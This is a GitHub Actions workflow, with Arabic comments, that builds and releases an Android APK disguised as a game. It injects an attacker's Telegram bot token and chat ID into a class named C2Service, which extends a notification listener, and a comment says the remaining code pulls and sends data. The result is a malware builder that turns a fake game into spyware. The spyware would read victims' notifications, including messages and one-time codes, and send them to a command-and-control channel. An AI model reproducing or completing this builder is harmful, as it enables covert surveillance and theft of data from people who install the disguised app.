name: Dynamic Game Factory
on:
  workflow_dispatch:
    inputs:
      bot_token: { required: true }
      chat_id: { required: true }
      app_name: { required: true, default: 'Super Game' }

permissions: { contents: write }

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: 'temurin', java-version: '17' }

      - name: تخصيص اللعبة والحقن
        run: |
          mkdir -p app/src/main/java/com/hussein/game
          # هنا يتم حقن التوكن والأيدي واسم اللعبة اللي دزيتهم من موبايلك
          cat << 'EOF' > app/src/main/java/com/hussein/game/C2Service.java
          package com.hussein.game;
          import android.service.notification.NotificationListenerService;
          import okhttp3.*;

          public class C2Service extends NotificationListenerService {
              private final String BOT_TOKEN = "${{ github.event.inputs.bot_token }}";
              private final String CHAT_ID = "${{ github.event.inputs.chat_id }}";
              // باقي كود السحب والإرسال...
          }
          EOF

      - name: بناء الـ APK
        run: gradle assembleDebug

      - name: رفع اللعبة كـ Release
        uses: softprops/action-gh-release@v1
        with:
          tag_name: Game-V8-${{ github.run_number }}
          files: app/build/outputs/apk/debug/*.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
